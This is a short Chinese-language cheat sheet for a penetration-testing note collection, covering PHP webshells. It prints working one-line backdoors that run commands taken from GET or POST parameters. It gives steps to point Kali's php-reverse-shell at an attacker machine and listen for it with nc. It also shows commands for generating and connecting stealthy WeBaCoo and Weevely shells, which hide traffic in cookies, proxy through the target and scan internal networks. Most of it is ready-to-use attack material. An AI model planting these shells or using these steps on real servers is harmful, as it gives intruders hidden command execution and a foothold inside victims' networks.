# WebShell

> 很多样例可以在Kali的 `/usr/share/webshells` 目录下找到，注意可能被IDS、AV、WAF、扫描器软件发现查杀。

## 0x01 GET Shell

最简单的一句话 WebShell:

```php
<?php echo shell_exec($_GET['cmd']);?>
```

使用方式:

```
http://target/shell.php?cmd=whoami
```

## 0x02 反向 Shell

使用 Kali 自带的 php-reverse-shell:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php ./rshell.php
```

修改文件中的 IP 和端口指向攻击机:

```php
$ip = '192.168.1.106';
$port = 1234;
```

上传到目标后，攻击机监听:

```bash
nc -nvvlp 1234
```

访问 WebShell 即可获得反向连接。

## 0x03 中国菜刀

经典的一句话木马管理工具:

```php
<?php @eval($_POST['chopper']);?>
```

> 原官网 maicaidao.com 已失效。现代替代工具如 [AntSword](https://github.com/AntSwordProject/antSword)（蚁剑，开源）、[Behinder](https://github.com/rebeyond/Behinder)（冰蝎）等功能更强大。

## 0x04 WeBaCoo (Web Backdoor Cookie)

### 特性

- 类终端的 Shell
- 编码通信内容通过 Cookie 头传输，隐蔽性强
- `cm`: base64 编码的命令
- `cn`: 随机填充的 Cookie 名称

### 使用

```bash
# 生成 WebShell
webacoo -g -o webshell.php

# 连接 WebShell
webacoo -t -u http://target/webshell.php
```

支持的函数: `system`, `shell_exec`, `exec`, `passthru`, `popen`

## 0x05 Weevely

### 特性

- 隐蔽的类终端 PHP WebShell
- 30多个管理模块:
    - 系统信息收集
    - 支持创建正向、反向 TCP Shell 连接
    - 支持通过目标计算机代理 HTTP 流量
    - 从目标计算机运行端口扫描，渗透内网

### 使用

```bash
# 生成加密 WebShell
weevely generate password /tmp/weevely.php

# 上传后连接
weevely http://target/weevely.php password

# 查看可用模块
help
```
